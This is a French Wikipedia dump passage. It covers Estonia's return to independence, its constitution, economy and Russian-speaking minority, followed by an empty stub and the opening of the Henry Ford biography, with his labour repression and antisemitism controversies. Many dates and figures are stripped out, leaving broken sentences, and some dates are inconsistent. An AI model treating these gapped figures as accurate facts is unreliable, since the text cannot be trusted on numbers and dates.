La position des partis modérés se radicalise pour plusieurs raisons : l'URSS est en train de s'effondrer et la politique de Gorbatchev est manifestement en train d'échouer, les négociations avec Moscou sur le nouveau statut de l'Estonie ont du mal à aboutir, l'indépendance semble une solution de plus en plus viable. Sous la pression de l'opinion publique, la position des modérés se rapproche de celle issue du Congrès. Fin mars 1989, le Soviet suprême annonce que l'Estonie va entamer une phase transitoire destinée à préparer l'indépendance. Cette démarche progressive permet, contrairement aux autres pays baltes qui déclarent de manière abrupte et unilatérale leur indépendance, de ne pas prendre de front le « grand frère » soviétique et d'éviter les mesures de rétorsion. Savisaar, qui a rendu sa carte du parti communiste, devient Premier ministre de l'Estonie début avril. Il tente avec les autres dirigeants baltes de négocier avec Gorbatchev l'indépendance, mais celui-ci refuse de peur de provoquer un éclatement complet de l'Union soviétique. La situation est tendue : des manifestants liés à l'Interfront pro-soviétique tentent en vain de prendre d'assaut le siège du gouvernement, multiplient les grèves et les mouvements dans la rue. Les soviétiques stationnés sur le territoire estonien sont ressentis comme une menace. L'effondrement économique provoqué par la sortie de l'économie dirigée accentue la tension au cours du premier trimestre 1989. Dans les trois États baltes, un référendum est organisé début mars pour décider de l'indépendance. Les partisans l'emportent avec 78 % des voix. Un tiers des russophones y sont favorables. Le coup d'État avorté du 19 août 1991 mené à Moscou par les durs du régime soviétique contre Gorbatchev permet à l'Estonie de franchir le dernier pas. Le Congrès estonien et le Soviet Suprême réunis en séance le 20 déclarent la restauration de l'indépendance de l'Estonie, c'est-à-dire que l'occupation soviétique est traitée comme une parenthèse illégale, ce qui constituera par la suite une des sources de contentieux avec les dirigeants russes. L'indépendance est reconnue dès le 21 août par le dirigeant russe Boris Eltsine. Le 25 août, la Russie reprend son indépendance et l'Union soviétique est dissoute.
Le retour de l'indépendance (à compter de 1991).
La nouvelle constitution de 1991.
L'assemblée constituante formée par la réunion du Soviet suprême et du Congrès estonien choisit de ne pas rétablir la constitution de 1920 qui avait abouti à l'époque à une paralysie de l'action gouvernementale et ne reconduit pas non plus la constitution autoritaire mise en place par Päts en 1937 et qui était encore en vigueur au moment de l'invasion soviétique. La nouvelle constitution estonienne opte pour un régime parlementaire doté d'une seule chambre comportant élus pour quatre ans au suffrage universel direct et proportionnel. Le président de la République, qui détient des pouvoirs de représentation et de proposition, est élu pour cinq ans par les députés et son mandat est reconductible une seule fois. Le pouvoir exécutif est dirigé par le Premier ministre nommé par le président et est responsable devant l'assemblée. Une Cour suprême contrôle le caractère constitutionnel des lois et un chancelier, nommé par l'assemblée pour sept ans, sert de médiateur entre l'État et les particuliers. L'Estonie adopte une structure centralisée avec seulement deux niveaux de subdivision : le district ("maakond") et le municip rural ("vald") ou urbain ("linnad"). L'Église et l'État sont séparés et le droit des minorités est garanti par la loi.
La vie politique.
La première élection législative a lieu en septembre 1992 et porte au poste de président Lennart Meri, fils d'un diplomate de l'entre deux guerres, ancien déporté, cinéaste, ethnologue et romancier qui a dirigé en 1990-1991 les services diplomatiques du pays. Très populaire dans son pays comme à l'étranger, il effectue deux mandats. Arnold Rüütel lui succède en 2001. Celui-ci s'est illustré au moment du rétablissement de l'indépendance mais il est rattrapé par son passé d'ancien membre de la nomenklatura au moment de sa réélection en 2006. Il est battu par Toomas Hendrik Ilves, fils d'émigré estonien, ancien diplomate et député européen. Depuis le rétablissement de l'indépendance, les partis forment des coalitions fragiles entraînant une succession relativement rapide de gouvernements (11 entre 1991 et 2007). Les programmes des partis sont très proches et aucun, par réaction envers la période soviétique, n'affiche une étiquette véritablement de gauche. Il y a consensus sur l'adhésion à l'OTAN, l'orientation libérale en matière économique et sociale ainsi que la méfiance vis-à-vis de la Russie. Le Parti centriste d'Edgar Savisaar, par ailleurs maire de Tallinn, est régulièrement en tête des élections, mais son leader, à la réputation sulfureuse et idéologiquement marquée par son affrontement avec le Congrès estonien au début de l'indépendance, n'a jamais pu avoir la responsabilité d'un gouvernement.
Une économie libérale florissante.
Les gouvernements estoniens ont donné une orientation particulièrement libérale à l'économie, en faisant les choix les plus radicaux de tous les anciens pays socialistes. Le système fiscal défini en 1993, est d'une grande simplicité : il comporte une taxe sur le foncier de 2 %, une TVA de 18 % et un impôt sur les revenus des particuliers et des entreprises à taux unique (21 % en 2008, 18 % en cible) avec une assiette très large. Les droits de douane, initialement nuls, ont été alignés sur la législation de l'Union européenne. Les investissements des sociétés sont exonérés d'impôt et il n'y a pas d'impôt sur les successions en ligne directe. La politique budgétaire est d'une stricte orthodoxie notamment via un refus des déficits. La couronne a remplacé le rouble. Depuis 2004 son cours est lié à l'euro. L'Estonie a longtemps souffert d'une inflation assez forte (8,2 % en 1998) qui l'a empêché d'adhérer au système européen de la monnaie unique. Celle-ci ayant faibli, l'Estonie a adopté l'euro le janvier 2011.
La dénationalisation de l'activité industrielle a été menée très rapidement dans les années 1990 sous la houlette d'une Agence de privatisation qui a liquidé l'ensemble du patrimoine industriel d'État. Beaucoup d'entreprises ont été fermées tandis que plus de nouvelles apparaissent au cours de la même période. L'État a toutefois conservé la propriété de certaines revues culturelles, des principaux théâtres et salles de concert. Dans les campagnes, les terres ont été restituées à leurs anciens exploitants ou à leurs descendants. Ce choix, en partie idéologique, est plutôt un échec, car la taille des fermes, généralement trop faible, ainsi que le sous-investissement hérité de la période soviétique, limite la viabilité des exploitations dans le contexte d'une économie ouverte. Le secteur primaire ne représente plus que 4,5 % des emplois (2004). En ville les terrains et les locaux commerciaux ont été rendus à leurs propriétaires de 1939 mais ce processus s'est heurté à l'éloignement des émigrés et de la disparition d'une partie des déportés.
Le secteur secondaire a subi une reconversion totale. L'industrie lourde héritée de l'époque soviétique a pratiquement disparu au profit d'industries légères comme la construction de téléphones portables pour le compte de la firme du voisin finlandais Nokia. Le secteur du bois et le BTP sont les deux secteurs qui assurent la plus forte croissance industrielle. Le pays continue à s'appuyer sur ses importantes réserves de schistes bitumineux pour générer la quasi-totalité de son électricité malgré l'impact écologique négatif. L'emploi dans le secteur secondaire, qui était passé de 35 % en 1985 à 18 % en 1998, s'est redressé à 29 % en 2003. Le domaine des services emploie en 2010 les deux tiers des estoniens. Tallinn tente de jouer un rôle central sur le plan bancaire au niveau de la région. L'explosion de la consommation a été accompagnée d'une refonte complète du système de distribution qui s'est hissé au niveau de celui des pays les plus avancés. Les infrastructures ont été complètement rénovées : l'Estonie a un des taux d'équipement en téléphone portable les plus élevés du monde.
Cette réorientation complète du mode de fonctionnement de l'économie a réussi à l'Estonie. Le taux de croissance, négatif jusqu'en 1996, s'est maintenu par la suite à une valeur particulièrement élevée, atteignant 11,6 % en 1997 sauf durant la Crise financière russe de 1998. Le taux de chômage, important au début de la reconversion de l'économie, est tombé à 6,3 % en 2006. La dernière crise financière de 2008 a toutefois durement touché l'économie du pays avec un PNB en baisse de 14,1 % en 2009 et un taux de chômage remonté à 10 %. Les principaux partenaires économiques de l'Estonie sont à la fin de la décennie dans l'ordre décroissant la Finlande, la Suède puis la Russie et l'Allemagne. Le changement a été bien accepté par la majorité de la population grâce à l'augmentation du niveau de vie qui l'a accompagné et qui a concerné toutes les couches de la population. Contrairement à ce qui s'est passé dans beaucoup d'anciens pays socialistes, l'enrichissement de certaines personnes est généralement le fruit de leur travail et l'Estonie est restée, malgré l'apparition de certaines inégalités, un pays sans classe, où les élites sont bien plus accessibles que dans maints pays occidentaux. Certaines catégories de la population n'ont pas autant profité du nouvel ordre économique : les russophones généralement moins qualifiés et touchés plus fortement par le chômage, les retraités dont les revenus sont particulièrement faibles et qui pâtissent d'un système embryonnaire de retraite et de prise en charge des frais de santé, et enfin les agriculteurs.
La question de la minorité russophone.
Au moment du retour à l'indépendance, les Russes représentent 40 % de la population, une proportion énorme qui se réduit quelque peu les premières années, du fait du retour de certains exilés et du départ d'environ : en 1992 il y a sur le territoire estonien auxquels il faut ajouter Ukrainiens et , soit en tout 33,1 % de la population. Après un débat houleux, l'assemblée législative estonienne met au point fin 1992 une loi sur la nationalité, qui accorde celle-ci uniquement aux personnes (ou leurs descendants) présents sur le sol estonien avant juin 1940, ce qui exclut la plus grande partie des russophones. Plusieurs lois sont passées à la même époque pour remplacer le russe par l'estonien dans l'espace public et dans les documents officiels à l'échelon national et local. Malgré les freins imposés par la loi sur la citoyenneté, en 1995, environ ont acquis la citoyenneté estonienne. La même année, l'assemblée législative vote une loi qui rend encore plus difficile l'obtention de la nationalité estonienne : les candidats doivent résider depuis huit ans, avoir une bonne connaissance de la langue et passer un examen civique en estonien. L'Estonie est régulièrement stigmatisée par des dirigeants moscovites, à la recherche de moyens de pression, pour « ses atteintes aux droits de l'homme ». Elle a assoupli sa législation en partie à la demande du Conseil de l'Europe. En 2010 il reste toutefois 8 % d'apatrides dans la population estonienne : ce sont des russophones ayant perdu la nationalité soviétique au moment de la disparition de l'URSS et qui ne remplissent pas les conditions leur permettant d'accéder à la nationalité estonienne. Ces russophones sont généralement désireux de s'intégrer dans la société estonienne, malgré un mode de vie plutôt communautaire. Mais ils sont moins bien armés que les Estoniens de souche pour s'adapter à la transformation rapide du pays ; l'ancienne génération arrivée officiellement pour « remettre sur pied un pays ruiné et assister une population ayant eu un comportement « douteux » durant la grande guerre patriotique », ne comprend pas qu'on remette en cause son statut.
L'intégration de l'Estonie dans l'Europe et l'Otan.
Les relations avec la Russie, naturellement tendues dès la reprise de l'indépendance, se sont encore rafraîchies après l'arrivée de Vladimir Poutine au pouvoir en Russie. Celui-ci et son successeur font pression sur les pays baltes en exploitant le malaise des russophones. Les dirigeants russes accusent l'Estonie d'opprimer la minorité russophone et d'encourager la résurgence du fascisme. Ils n'ont pas hésité à menacer le pays de blocus en 2002. L'ambassade d'Estonie à Moscou a été attaquée en 2007 par des membres des jeunesses présidentielles (Nachi) tandis que des cyberattaques sont régulièrement lancées depuis le territoire russe contre les sites estoniens. Bien que l'Estonie ait renoncé aux territoires perdus lors de la rectification de frontière qui a suivi l'invasion soviétique en 1939, la Russie refuse de ratifier le traité sur son tracé. Consciente de ce que pourrait lui coûter un isolement militaire et diplomatique face à un voisin puissant et hostile, l'Estonie a intégré l'OTAN en 2004, renforçant le courroux des dirigeants russes. L'intégration de l'Estonie à l'Union européenne répond en partie à la gestion de la menace russe ainsi qu'au souhait de s'ancrer à l'Europe occidentale. Effective depuis 2004, elle a suscité moins d'enthousiasme dans la population (67 % de oui au référendum) qui craignait pour son indépendance retrouvée depuis peu, bien que tous les partis politiques estoniens aient soutenu le processus d'adhésion.
Galerie de dirigeants politiques depuis 2000.
Présidence de la république d'Estonie
Liste des chefs du gouvernement estonien

</doc>
<doc id="1441" url="https://fr.wikipedia.org/wiki?curid=1441" title="Histoire contemporaine">
Histoire contemporaine



</doc>
<doc id="1442" url="https://fr.wikipedia.org/wiki?curid=1442" title="Henry Ford">
Henry Ford

Henry Ford, né le à Dearborn (Michigan, États-Unis) et mort le dans la même ville, est un industriel américain de la première moitié du et le fondateur du constructeur automobile Ford. Son nom est notamment attaché au fordisme, une méthode industrielle alliant un mode de production en série fondé sur le principe de ligne d’assemblage et un modèle économique ayant recours à des salaires élevés. La mise en place de cette méthode au début des années 1910 révolutionne l’industrie américaine en favorisant une consommation de masse et lui permet de produire à plus de d’exemplaires la Ford T ; il devient alors l’une des personnes les plus riches et les plus connues au monde.
Ford a une vision globale de son action : il voit dans la consommation la clé de la paix. Son important engagement à réduire les coûts aboutit à de nombreuses innovations techniques mais également commerciales ; il met ainsi en place tout un système de franchises qui installe une concession Ford dans un maximum de villes en Amérique du Nord et dans les grandes villes des six continents. La Fondation Ford hérite de la majeure partie de la fortune de Ford, mais l’industriel veille néanmoins à ce que sa famille en conserve le contrôle de façon permanente. D’ailleurs, il assumera très longtemps le poste de président de la . Dans les années 1930, Ford se constitue, selon l'expression du "New York Times", « la plus importante troupe militaire privée du monde ». Il s'associe à la pègre de Détroit, notamment afin de recruter des mercenaires capables d'intimider les syndicalistes et de mener des actions punitives contre les ouvriers grévistes.
Le diplôme de docteur en ingénierie lui est délivré par l’université du Michigan et le collège de l’État du Michigan. Il reçoit par ailleurs un "LL.D." honoraire de l’université Colgate. En collaboration avec Samuel Crowther, il écrit ' (1922), ' (1926) et ' (1930) qui décrivent le développement de son entreprise et expose ses théories sociales et industrielles. Son nom est également associé au livre ' ainsi qu’au journal "", ce qui lui vaudra de nombreuses controverses concernant son antisémitisme et ses liens avec le régime nazi, certains voyant en lui l'un des maîtres à penser de Hitler.
Premières années.
Origines irlandaises et enfance à Dearborn.
Le père d’Henry Ford, William Ford (1826-1905), est natif de la paroisse de Kilmalooda, située dans le comté de Cork en Irlande. En 1847, âgé de , il immigre avec sa famille aux États-Unis où, l’année suivante, son père John Ford fait l’acquisition auprès d’un vieil homme également originaire de Cork, d’une ferme dans le comté de Wayne près de Détroit. C’est dans cette ferme où il travaille avec son père que William fait la connaissance de Mary Litogot (1839-1876), dont il tombe amoureux. Née dans le Michigan de parents immigrés belges, elle est la fille adoptée d’un des employés de la ferme, Patrick Ahern. William et Mary officialisent leur union le ; après leur mariage, ils décident de s’installer ensemble à "", la résidence où vivent les parents de Mary, à Dearborn. Le , Mary donne naissance à Henry Ford, l’aîné d’une fratrie qui comptera six enfants.
Henry fréquente l’école jusqu’à l’âge de . Il n’éprouve que peu d’intérêt pour ses études et se révèle piètre élève ; d’ailleurs, il n’apprendra jamais à orthographier ni à lire correctement, et ne s’exprimera toujours que de la manière la plus simple. S’il n’aime guère plus la vie agricole, Henry Ford se passionne en revanche très tôt pour la mécanique. À l’âge de , il reçoit une montre de poche de son père qu’il parvient à démonter et remonter de nombreuses fois, gagnant une réputation de réparateur de montres auprès de ses voisins et amis. Selon Henry Ford, . Par la suite, Ford passe le plus clair de son temps dans un atelier qu’il équipe lui-même et où il construit, à l’âge de , sa première machine à vapeur.
Jeunesse.
Malgré les besoins de l'exploitation agricole familiale, Henry Ford, à l’âge de , est autorisé par ses parents à partir travailler à Détroit ; il y est notamment employé comme apprenti dans un atelier d’usinage métallique. Son salaire hebdomadaire de ne lui permet cependant pas de payer sa chambre et ses repas si bien qu’il travaille également de nuit dans un atelier de réparation de montres et d’horloges. Après trois années passées à Détroit, Ford retourne travailler à la ferme. C’est à cette période qu’il fabrique pour "" – une entreprise de location et de réparation de moteurs – une petite machine agricole à vapeur, dont le châssis et une partie du moteur sont issus d’une vieille tondeuse à gazon. Plusieurs années après la mort de sa mère en 1876, Henry fait la rencontre de Clara Bryant, la fille de Melvin Bryant, un fermier du comté de Wayne. Ils se marient le et donnent naissance à un fils dénommé Edsel Ford, le .
En 1891, Ford retourne à Détroit, accompagné de sa famille, en tant qu’ingénieur mécanicien chez "". Devenu ingénieur en chef en 1893, il a suffisamment de temps et d’argent pour se consacrer à quelques expériences personnelles sur les moteurs à essence. Elles aboutissent en 1896 avec l’achèvement de son propre véhicule automobile nommé « Ford Quadricycle », un véhicule de à 4 roues refroidi par eau. La même année, lors d’une convention tenue à Manhattan Beach, à New York, destinée à trouver des investisseurs, Ford est présenté à Thomas Edison, expliquant que . Après lui avoir posé quelques questions, Edison finit par déclarer : ()
Encouragé par cette approbation, Ford démissionne de la société Edison et fonde le , avec le soutien de l’industriel William H. Murphy, la ' dans le but de produire des automobiles. Sans succès, l’entreprise est dissoute en janvier 1901. Pour autant, Ford et Murphy ne se découragent pas et créent une nouvelle entreprise : la '. Pour se faire connaître, Ford fait preuve d’imagination. En , avec l’aide de son associé Childe Harold Wills, il participe à une course de sur le circuit de Grosse-Pointe au volant d’une automobile de compétition qu’il a conçue, la 999. Ford la remporte devant Alexander Winton, un coureur réputé. Grâce à cette victoire largement diffusée dans la presse, Ford se fait connaitre à travers tous les États-Unis.
Cependant en 1902, Ford est en profond désaccord avec plusieurs actionnaires de l’entreprise ; ces derniers désirent mettre sur le marché dès à présent une voiture de tourisme tandis que Ford insiste encore et toujours pour poursuivre l’amélioration de l’automobile sur laquelle il travaille. Ford décide donc de quitter la '. Elle sera reprise par Henry M. Leland qui la renomme '.
Automobile et ".
Des débuts difficiles au succès des premiers modèles.
Peu de temps après son départ, Henry Ford propose à Alexander Malcomson, une connaissance rencontrée lorsqu’il était employé chez Edison, de participer à la création d’une nouvelle entreprise de fabrication d’automobiles. Malcomson accepte et ils fondent ensemble un partenariat dénommé ". Leur premier modèle est la Ford A (T33), une petite berline de conception bon marché destinée à être vendue à environ . En 1903, Ford et Malcomson se mettent d’accord pour vendre une partie de leurs parts de l’entreprise, notamment aux frères John et Horace Dodge.
Les commandes n’affluant pas, l’entreprise se retrouve rapidement en difficulté et n’est pas en mesure de payer les frères Dodge. Malcomson se tourne alors vers John S. Gray, le président de la banque germano-américaine de Détroit. Gray investit dans leur entreprise. Malcomson convainc également quelques-uns de ses jeunes employés d’investir ; finalement, Malcomson récolte . Le , ' devient ', entreprise dirigée par Gray. Ford, tout comme Malcomson, possède alors 25,5 % des parts de la nouvelle organisation en tant que vice-président ; il en deviendra président le .
Entre-temps, en janvier 1904, il bat le record du monde de vitesse terrestre sur un modèle Arrow au Lac Sainte-Claire (un lac alors gelé d', près de New Baltimore, MI), époque où Barney Oldfield et Tom Cooper conduisent régulièrement dans des courses sur ovales la 999, Ford lui-même en disputant quelques-unes en 1905, avec au passage une victoire à Ventnor Beach (NJ) en septembre sur le mile, lors d'un challenge contre une Darracq. Au total Ford bat personnellement trois records mondiaux automobiles avec sa 999, en plein hiver sur son lac de prédilection : deux sur le mile lancé (1903 et 1904), et un sur le kilomètre lancé (1904), pour plusieurs autres tentatives infructueuses sur ovales en terre battue à cette période de sa vie. En 1906, il prend la mer en compagnie de Vincenzo Lancia et de Victor Demogeot (le futur vainqueur) pour venir assister le à la seconde Course cubaine à La Havane.
La nouvelle entreprise est cette fois-ci une réussite : de profit sont réalisés les six premiers mois et sur l’année. Pour accroître leurs profits, Malcomson souhaite investir le marché des automobiles de luxe, le segment automobile le plus porteur selon lui ; Ford est récalcitrant mais doit finalement se résigner à accepter. Les Ford Modèle B et Modèle K vont ainsi voir le jour ; les clients sont au rendez-vous si bien qu’en 1907, les profits excèdent le million de dollars.
Ford T ou un mode de production révolutionnaire.
C’est ce que proclame Henry Ford peu avant la naissance de la Ford T ou "" (« la bonne à tout faire de fer blanc »). Introduite le , elle est très simple à conduire et peu coûteuse à réparer. La Ford T est de surcroît tellement bon marché en 1908 que, dans les années 1920, une majorité de conducteurs américains apprennent à conduire dessus. La Ford T va connaître un succès sans précédent jusqu’alors dans l’histoire de l’automobile ; au lendemain de la Première Guerre mondiale, la Ford T équipe près d’un ménage américain sur deux, parmi ceux qui possèdent une voiture.
Henry Ford doit notamment ce succès au fordisme, un mode de développement inspiré du taylorisme basé sur la rationalisation et la standardisation. La rationalisation, ou plus simplement la décomposition de l’activité de l’ouvrier en tâches élémentaires lui permettant de travailler sur des machines-outils spécialisées, conduit à une simplification et une normalisation des gestes ainsi qu’une augmentation conséquente de la productivité. La standardisation quant à elle, méthode déjà utilisée dans l’industrie de l’armement dont certains ingénieurs de la Ford Motor Company sont issus, permet . La standardisation dans les usines Ford est tellement poussée à l’extrême que seule la Ford T est produite, et uniquement en noir en raison, a-t-on dit, de son temps de séchage rapide, plus probablement de son moindre coût. Cette méthode favorise, non seulement l’augmentation de la production, mais également l’expansion géographique de la Ford T puisque des pièces détachées standards peuvent être aisément envoyées pour réparation.
Lorsqu’en 1913, Ford introduit le déplacement des pièces sur des convoyeurs, le temps de montage du châssis de la Ford T passe de à ; . L’idée de cette ligne ou chaîne d’assemblage lui est venue, d’après ses mémoires, lors d’une visite lorsqu’il était adolescent d’un abattoir de Chicago. Mais bien qu’il soit souvent crédité de l’idée, les sources indiquent que le concept et son développement sont en réalité dus à quatre de ses employés : Clarence Avery, Peter E. Martin, Charles E. Sorensen, et C. Harold Wills. Ces transformations du mode de production, qui vont s’inscrire durablement dans la plupart des industries du début du , permettent une forte diminution du coût de revient. Une Ford T vaut au lancement du modèle ; cela correspond certes à plus d'un an de salaire d’un enseignant, mais reste nettement inférieur au prix moyen d’une automobile qui avoisinait alors près de . Et le prix ne cessera de diminuer à mesure de l’augmentation de la production : de en 1911, il est de en 1914 puis de en 1916, et enfin de en 1927. Les ventes de Ford T sont également décuplées et passent de en 1914 à en 1916, puis un million au début des années 1920.
Le dernier aspect de ce succès concerne le marketing ; Ford crée une machine de publicité massive à Détroit, pour s’assurer que tous les journaux retransmettent les annonces sur ses produits, ainsi qu’un important réseau de distributeurs introduisant l’automobile dans pratiquement toutes les villes d’Amérique du Nord. Les ventes augmentent en flèche. Finalement, lorsque la production de la Ford T cesse le , ce sont qui ont été vendues en ; ce record a tenu dans les qui suivirent. 
Déclin du Modèle T et naissance du Modèle A.
Henry Ford cède la présidence de "" à son fils Edsel Ford en décembre 1918 ; âgé de , il conserve toutefois un pouvoir discrétionnaire. Interrogé sur le devenir de la "Ford Motor Company", Ford répondait que s’il n’était pas le maître de sa propre entreprise, il en construirait une autre. C’est ainsi qu’en juillet 1919, il rachète l’ensemble des parts, pour un montant de près de de dollars, qu’il partage avec les membres de sa famille.
Au milieu des années 1920, les ventes du modèle T commencent à décliner en raison de l’augmentation de la concurrence. D’autres marques automobiles offrent à leurs clients la possibilité d’acquérir une automobile à crédit, ce que Ford a toujours refusé, avec de meilleures prestations et un style plus moderne que le modèle T. En dépit des demandes pressantes d’Edsel, Henry refuse toujours d’intégrer de nouvelles fonctionnalités au modèle T ou toute forme de plan de crédit client. Ce déclin s’explique également par des raisons sociales et commerciales : d’une part, les ouvriers se lassent d’un travail jugé peu valorisant, et d’autre part, l’élévation générale du niveau de vie permet aux autres constructeurs de miser sur la segmentation du marché. Les clients sont en effet de plus en plus soucieux de se distinguer socialement par leur automobile et de disposer d’une voiture confortable. Posséder une Ford T n’est plus aussi valorisant et conduit les clients à renouveler leur voiture en se portant vers des marques plus prestigieuses.
En 1926, Henry est finalement convaincu qu’il faut développer un nouveau modèle. Il suit le projet avec beaucoup d’intérêt pour la conception du moteur, du châssis, de la mécanique et d’autres aspects, tout en laissant le gros de la conception à son fils. La Ford Modèle A (deuxième du nom) voit le jour en 1927 ; elle connaîtra en 1931 une production totale de plus de quatre millions d’unités.
Ford à l'international.
Le "leitmotiv" de Ford est l’indépendance économique, voire l’autarcie, des États-Unis. Son complexe industriel de "" est l’un des sites industriels les plus importants de l’époque, capable de produire l’acier nécessaire à sa production. Son objectif premier est de produire un véhicule à partir de zéro et ce, sans avoir recours au commerce extérieur. Il croit en l’expansion mondiale de son entreprise et estime que le commerce et la coopération internationale conduisent à la paix ; il utilise d’ailleurs la ligne d’assemblage de traitement et de production du modèle T pour le démontrer.
Ford ouvre des usines de montage au Royaume-Uni et au Canada en 1911, et devient rapidement le plus grand producteur automobile de ces pays. En 1912, Ford coopère avec Giovanni Agnelli, dirigeant de Fiat, afin de lancer la première chaîne de montage automobile italienne. La première des usines en Allemagne est construite dans les années 1920 avec le soutien d’Herbert Hoover et du Département du commerce, qui partage la théorie de Ford selon laquelle le commerce international est essentiel pour la paix dans le monde. Dans les années 1920, Ford ouvre également des usines en Australie, en Inde, et en France. En 1929, Ford dispose de concessionnaires sur les cinq continents. Ford expérimente également une plantation de caoutchouc dans la jungle amazonienne appelé "Fordlândia" : sa superficie représente de l’État brésilien du Pará. Mais celle-ci est l’un de ses rares échecs. "Fordlândia" visait à mettre fin à la dépendance de Ford envers le caoutchouc venant de la Malaisie britannique.
En 1932, Ford produit le tiers des automobiles construites dans le monde. L’image de l’entreprise suscite différentes réactions chez les Européens, en particulier les Allemands : . Partisans et détracteurs insistent sur le fait que le fordisme américain incarne le développement capitaliste, et que l’industrie automobile est la clé pour comprendre les relations économiques et sociales aux États-Unis. Comme le déclare à cette époque un Allemand, « l’automobile a à ce point révolutionné le mode de vie américain qu’il est à peine croyable qu’on puisse vivre sans voiture. Il est difficile de se souvenir comment on faisait avant que Ford vienne prêcher son nouvel évangile ». Pour beaucoup d’Allemands, la réussite de l’américanisme est essentiellement attribuée à Henry Ford.
Henry Ford est l’un des pionniers du " (le « capitalisme du bien-être »), une pratique industrielle paternaliste destinée à améliorer le niveau de vie des travailleurs. Le , Ford annonce l’augmentation des salaires journaliers minimum de à pour les ouvriers en apprentissage () ainsi qu’une nouvelle réduction du temps de travail journalier de à . Qualifié de ou de , Ford n’a pas mis en place cette initiative pour établir une solide classe moyenne capable d’acheter ses produits, comme on l’a parfois avancé, ni même par acte de charité. Comme il l’explique lui-même dans ses mémoires, c’est l’.
En effet, Henry Ford agit uniquement dans l’intérêt de son entreprise. Ses usines sont en proie à un important "", qui conduit de nombreux départements à devoir engager annuellement pour remplir de travail, et à un absentéisme excessif. Par ailleurs, presque tous les emplois sont monotones, et le travail sur les chaînes d’assemblage est extrêmement pénible à force de réaliser la même procédure toute la journée. Embaucher et former des travailleurs « de remplacement » est par ailleurs très coûteux. L’augmentation des salaires est donc une solution pour lutter contre ces difficultés. Cette philosophie du travail permet d’augmenter rapidement la productivité, mais les salaires demeurent quasiment inchangés pendant : en 1919 et en 1927.
Le « Département social Ford » utilise néanmoins des enquêteurs pour s’assurer que ceux qui bénéficient d’une participation aux bénéfices soient irréprochables. On conseille d’ailleurs fortement aux ouvriers de ne pas fumer, non seulement à l’usine, mais également à la maison. « Si vous étudiez l’histoire de la plupart des criminels, vous constaterez qu’ils étaient des fumeurs invétérés », expliquait Henry Ford. L’alcool, les jeux d’argent et le billard sont également strictement interdits. Henry Ford se préoccupe des loisirs de ses employés, et crée notamment à leur intention le Old-time Dance Orchestra avec salle de bal, orchestre et cours de dance pour les enfants. L’intrusion excessive de Ford dans la vie privée de ses employés sera longtemps source de controverses. Dans ses mémoires de 1922, Ford affirmait pourtant que « le paternalisme n’avait pas sa place dans l’industrie ».
Dans les années 1930, Ford se constitue, selon l'expression du New York Times, « la plus importante troupe militaire privée du monde ». L'entreprise s'associe à la pègre de Détroit notamment afin de recruter des mercenaires capables d'intimider les syndicalistes et de mener des actions punitives contre les ouvriers grévistes.
Dès 1927, la direction de Ford passe un accord avec le « Al Capone de Détroit », Chester LaMare, puis s'associe à Joe Adonis, l'un des chefs de la mafia new-yorkaise. Après un accident de la route survenu à Henry Ford, en 1927, Harry Bennett, le « directeur du personnel » et véritable de l'entreprise, se dit en mesure de rassurer le public quant à l'hypothèse que son patron aurait été victime d'un attentat :« Nos liens avec la pègre de Détroit sont tels que moins de vingt-quatre heures après qu'un tel projet ait été tramé, nous en serions informés ».
L'affrontement le plus violent entre des recrues de la milice patronale et des syndicalistes eut lieu le , devant l'usine de River Rouge où des dizaines d'ouvriers syndiqués à la "United Auto Workers" s’apprêtant à distribuer des tracts sont attaqués. D'après les témoignages réunis par la Commission nationale des relations industrielles en , cinq miliciens étaient affectés pour chaque syndicaliste. En raison de la violence de ses pratiques anti-syndicales, le New York Times décrivait Ford comme étant « un fasciste de l'industrie — le Mussolini de Detroit ».
Diversification dans l'aviation.
Plus connu pour ses automobiles, Ford s’investit pourtant relativement tôt dans l’aéronautique. En 1923, Edsel Ford fait l’acquisition de la ' et développe le Stout 2-AT Pullman. En 1925, il fonde la ', qui marque le lancement de l’étude du premier avion expérimental Ford ; dénommé Ford Trimotor, sa mise sur le marché intervient en 1926. Ce premier avion constitue un progrès technologique majeur et permet à Ford de devenir le premier fabricant d’avions commerciaux au monde. Les compagnies aériennes abandonnent progressivement leurs avions et les remplacent par des avions Ford dont la capacité de transport de passagers est nettement supérieure à la concurrence. Ils sont ainsi rapidement utilisés pour créer le premier service aérien transcontinental.
La participation de Ford dans l’aviation joue également un rôle important dans la victoire des Alliés pendant la Première et la Seconde Guerre mondiale. Pendant la Première Guerre mondiale, la Ford Motor Company produit en masse des moteurs V8 Liberty destinés à équiper l’aviation américaine et développe le Kettering Bug, le premier missile guidé américain. Au cours de la Seconde Guerre mondiale, Henry Ford soutient la construction de milliers de Pratt &amp; Whitney « Double Wasp » ainsi que des moteurs de bombardiers Consolidated B-24 Liberator. Le président américain Franklin D. Roosevelt fera d'ailleurs référence à Détroit comme faisant partie de l’« Arsenal des démocraties ».
Syndicats.
Ford a toujours farouchement refusé la présence des syndicats dans ses entreprises. Il les estime en effet fortement influencés par certains dirigeants, et qu’en dépit de leur apparente bonne volonté, leurs actions sont contre-productives pour le bien-être des travailleurs. Si restreindre la productivité est pour la plupart un moyen de favoriser l’emploi, Ford considère à l’inverse qu’elle est nécessaire pour accroître la prospérité économique et ainsi stimuler l’économie, ce qui par conséquent permet de créer de nouveaux emplois. Ford se méfie également des dirigeants syndicaux – plus particulièrement les léninistes – qu’il accuse de fomenter de perpétuelles crises socio-économiques de façon à maintenir leur propre pouvoir. En bon gestionnaire, il se considère néanmoins capable de repousser les attaques de politiques malavisés et de créer un système socio-économique dans lequel ni la mauvaise gestion ni les syndicats ne pourront trouver le soutien leur permettant de se maintenir.
Au début des années 1930, malgré la Grande Dépression, Henry Ford accélère la production à un rythme insupportable. Il règne sur ses usines par la crainte ; alors que leurs conditions de vie se dégradent, ouvriers et cadres se méfient des mouchards. Ford utilise en effet près de de main pour empêcher les syndicats d’entrer dans l’usine. Le maire de Détroit observe d’ailleurs qu’. Harry Bennett, un ancien Marine nommé à la tête du service de sécurité interne, emploie différentes tactiques d’intimidation pour écraser la syndicalisation dont le plus célèbre incident, survenu en 1937, aboutit à une bagarre sanglante ; l’événement sera connu sous le nom de « Bataille de l’Overpass ». La même année, Walter Reuther, futur président de l’"United Auto Workers" (l’Union des Ouvriers de l’Automobile) est brutalisé à "" pour avoir distribué des tracts syndicaux.
